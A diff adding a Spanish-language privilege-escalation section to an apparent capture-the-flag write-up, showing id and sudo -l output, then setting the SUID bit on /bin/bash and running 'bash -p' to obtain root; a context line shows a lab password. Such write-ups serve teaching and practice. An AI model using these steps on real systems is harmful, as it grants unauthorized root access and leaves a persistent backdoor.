@@ -181,6 +181,41 @@ password--->P@ssw0rd!User4dm1n2025!#-
 
 ## FASE ESCALADA DE PRIVILEGIOS
 
+Ejecuto `id` para ver en los grupos que estoy
+
+```
+uid=1001(admin) gid=1001(admin) groups=1001(admin),100(users)
+```
+y después `sudo -l` para ver si puedo ejecutar con privilegios sudo algo y:
+
+```
+[sudo] password for admin: 
+Matching Defaults entries for admin on 87678857b499:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User admin may run the following commands on 87678857b499:
+    (ALL) ALL
+
+```
+
+Sorpresa puedo utilizar cualquier cualquier cosa como su fuera root (ALL) ALL
+
+pues:
+
+```bash
+sudo chmod u+s /bin/bash
+```
+
+```bash
+/bin/bash -p
+```
+
+y ya somos root
+
+![Nmap Scan](images/tokenaso/17.png)
+
+
+
 
 
 
